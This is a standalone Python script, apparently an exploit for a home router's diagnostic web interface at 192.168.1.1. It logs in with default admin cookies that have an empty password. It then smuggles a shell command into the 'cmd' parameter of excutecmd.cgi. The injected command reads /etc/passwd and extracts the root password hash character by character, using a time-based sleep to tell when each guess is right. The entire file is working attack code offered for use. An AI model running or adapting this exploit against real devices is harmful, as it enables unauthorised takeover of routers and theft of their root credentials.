#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from time import time
from string import printable

TIMEOUT = 15
STR = printable[:-37]+":+-$/()*,. "
HEADERS = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; AskTB5.3)',
        'Accept:':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language':'en-US,en;q=0.5',
        'Accept-Encoding':'gzip deflate'}
URL = "http://192.168.1.1/html/excutecmd.cgi"

def my_cookies():
    return dict(Username="admin",
            Password="")

def main():
    pword = ""
    cmd = ";if test `sed -n '/^root:~/{s/^\(.\{1\}\).*/\1/g;p}' /etc/passwd`;then sleep %d;fi;" % (TIMEOUT)
    while True:
        for j in STR:
            print "[%s]" % j,
            p = cmd.replace("~", (str(pword)+str(j)))
            payload = {'cmd':p, 'RequestFile': '/html/management/diagnose.asp'}
            # print payload # Debug
            start = time()
            requests.post(URL, params=payload, cookies=my_cookies(), headers=HEADERS)
            end = time()
            diff = end - start
            print "-- diff:", diff # Debug
            if int(diff) > TIMEOUT:
                pword += str(j)
                print "FOUND", pword
                break
        else:
            break
    print "==>", pword, "<=="

if __name__ == "__main__":
    main()
